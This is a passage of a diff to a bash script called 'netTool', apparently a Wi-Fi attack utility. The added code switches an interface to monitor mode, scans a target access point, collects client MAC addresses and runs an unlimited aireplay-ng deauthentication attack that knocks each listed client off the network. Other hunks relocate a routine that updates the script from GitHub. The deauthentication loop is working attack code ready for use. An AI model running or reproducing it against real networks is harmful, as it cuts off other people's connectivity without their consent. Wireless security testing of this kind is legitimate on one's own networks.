+                        echo -e -n "$orange""Enabel monitor mode? (y/n) $nc"
+                        read answ3
+                        if [ "$answ3" = "y" ] || [ "$answ3" = "Y" ]; then
+                            sudo airmon-ng check kill >/dev/null 2>&1
+                            sudo ifconfig "$interface" down >/dev/null 2>&1
+                            sudo iwconfig "$interface" mode monitor >/dev/null 2>&1
+                            sudo ifconfig "$interface" up >/dev/null 2>&1
+                            chk_mode=$(iw dev "$interface" info | grep type | awk '{print $2}')
+                                if [ "$chk_mode" = "monitor" ] ;then
+                                    echo "Monitor mode enabled!"
+                                    sleep 1
+                                    clear
+                                    echo "Monitoring your Access-Point '$ESSID'"
+                                    echo -e "$blue""CTRL+C TO STOP MONITORING!$nc"
+                                    sleep 1
+                                    sudo xterm -geometry 90x50-0+1  -e "echo 'CTRL+C TO STOP MONITORING !' && airodump-ng --essid $ESSID $interface 2>&1 | tee ap_scan.txt" &&
+                                    clear
+                                    cat ap_scan.txt
+                                    echo -e -n "$orange""Type Access-Point's Channel :  $nc"
+                                    read dv_chan
+                                    echo -e -n "$yellow""How many target(s)? $nc"
+                                    read targets
+                                    xterm -geometry 80x20-0+1 -e "airodump-ng --bssid $BSSID -c $dv_chan $interface " & sleep 2
+                                    for (( i = 1; i < targets+1; i++ )); do
+                                        echo -e -n "$orange""Type Target's MAC-Address n° $i :  $nc"
+                                        read dv_mac
+                                        echo -e "$cyan""Kicking$nc""$red"" $dv_mac $nc"
+                                        sleep 0.5
+                                         
+                                        xterm -geometry 80x15-0-0 -e "sudo aireplay-ng -0 0 -a $BSSID -c $dv_mac $interface " & sleep 2
+                                    done
+                                    
+                                    echo -e "\e[1;32mPress RETURN TO STOP KICKING \c\e[0m"
+                                    read input
+                                    pkill airodump-ng
+                                    pkill aireplay-ng
+                                    echo "Restoring device to managed mode... "
+                                    sudo ifconfig "$interface" down >/dev/null 2>&1
+                                    sudo iwconfig "$interface" mode managed >/dev/null 2>&1
+                                    sudo ifconfig "$interface" up >/dev/null 2>&1
+                                    sudo systemctl restart NetworkManager 
+                                    sleep 5
+                                    echo -e "$blue""Going back to Menu...$nc"
+                                    sleep 1
+                                else 
+                                     echo -e "$red""Unable to change interface to monitor mode!$nc"
+                                     break
+                                fi
+                        else    
+                            echo "Going back to menu..."
+                             sleep 1
+                        fi
+                    fi     
+                fi
+                ;;
+                esac
+                ;;
 
-done & 
-trap 'kill $!' SIGTERM SIGKILL
-sleep 2
-wget -q --spider https://www.google.com
-if [ $? -eq 0 ]; then
-    echo -e "$green""Connected to internet$nc [$green✓$nc]"
-    kill $!
-    sleep 3
-    clear
-    sleep 0.5
-# Updating netTool
-    while true; do
-    echo -e $blue"Updating NetTool from Github"
-    sleep 0.1
-    clear
-    echo -e $blue"Updating NetTool from Github."
-    sleep 0.1
-    clear
-    echo -e $blue"Updating NetTool from Github.."
-    sleep 0.1
-    clear
-    echo -e $blue"Updating NetTool from Github..."
-    sleep 0.1
-    clear 
-    done &
-    trap 'kill $!' SIGTERM SIGKILL
-    sleep 1
-    netTool_path=$(find $HOME/ -name "netTool" | grep /NetTool/netTool)
-    NetTool_path=$(find $HOME/ -name "NetTool" | grep /NetTool)
-    cd >/dev/null 2>&1
-    cd $NetTool_path >/dev/null 2>&1
-    git reset HEAD --hard >/dev/null 2>&1
-    git pull origin master >/dev/null 2>&1
-    rm /usr/bin/netTool
-    cp $netTool_path /usr/bin
-    sleep 1
-    echo -e $green"Update success!" 
-    kill $!
-    sleep 0.5
-    echo -e $yellow"Applying Execution Permissions to netTool..."
-    sleep 0.5
-    chmod +x netTool >/dev/null 2>&1
-    chmod +x /usr/bin/netTool 2>&1
-    chmod +x update >/dev/null 2>&1
-    chmod +x install >/dev/null 2>&1
-    sleep 0.5
-    echo -e $blue"DONE"
-    sleep 1.5
-    echo -e $lightred"Please run 'netTool' again!"
-    sleep 2
-    exit 
-    
-else   
-    echo -e "$lightred""No internet connection$nc [$ligthred✗$nc]$nc"
-    echo -e "$yellow""Please make sure you are connected to internet!" "$nc"
-    kill $!
-    exit 1
-fi
-        ;;
         5)
+            #checking for internet
+            while true; do
+            echo -e "$yellow""Checking for internet connection$nc"
+            sleep 0.1
+            clear
+            echo -e "$yellow""Checking for internet connection.$nc"
+            sleep 0.1
+            clear
+            echo -e "$yellow""Checking for internet connection..$nc"
+            sleep 0.1
+            clear
+            echo -e "$yellow""Checking for internet connection...$nc"
+            sleep 0.1
+            clear
+            done & 
+            trap 'kill $!' SIGTERM SIGKILL
+            sleep 2
+            wget -q --spider https://www.google.com
+            if [ $? -eq 0 ]; then
+                echo -e "$green""Connected to internet$nc [$green✓$nc]"
+                kill $!
+                sleep 3
+                clear
+                sleep 0.5
+            # Updating netTool
+                while true; 
+                do
+                echo -e $blue"Updating NetTool from Github"
+                sleep 0.1
+                clear
+                echo -e $blue"Updating NetTool from Github."
+                sleep 0.1
+                clear
+                echo -e $blue"Updating NetTool from Github.."
+                sleep 0.1
+                clear
+                echo -e $blue"Updating NetTool from Github..."
+                sleep 0.1
+                clear 
+                done &
+                trap 'kill $!' SIGTERM SIGKILL
+                sleep 1
+                netTool_path=$(find $HOME/ -name "netTool" | grep /NetTool/netTool)
+                NetTool_path=$(find $HOME/ -name "NetTool" | grep /NetTool)
+                cd >/dev/null 2>&1
+                cd $NetTool_path >/dev/null 2>&1
+                git reset HEAD --hard >/dev/null 2>&1
+                git pull origin master >/dev/null 2>&1
+                rm /usr/bin/netTool
+                cp $netTool_path /usr/bin
+                sleep 1
+                echo -e $green"Update success!" 
+                kill $!
+                sleep 0.5
+                echo -e $yellow"Applying Execution Permissions to netTool..."
+                sleep 0.5
+                chmod +x netTool >/dev/null 2>&1
+                chmod +x /usr/bin/netTool 2>&1
+                chmod +x update >/dev/null 2>&1
+                chmod +x install >/dev/null 2>&1
+                sleep 0.5
+                echo -e $blue"DONE"
+                sleep 1.5
+                echo -e $lightred"Please run 'netTool' again!"
+                sleep 2
+                exit 
+                
+            else   
+                echo -e "$lightred""No internet connection$nc [$ligthred✗$nc]$nc"
+                echo -e "$yellow""Please make sure you are connected to internet!" "$nc"
+                kill $!
+                exit 1
+            fi
+                    ;;
+        e)
             echo -e "$lightred""Bye bye :)$nc"
             sleep 0.5
             clear
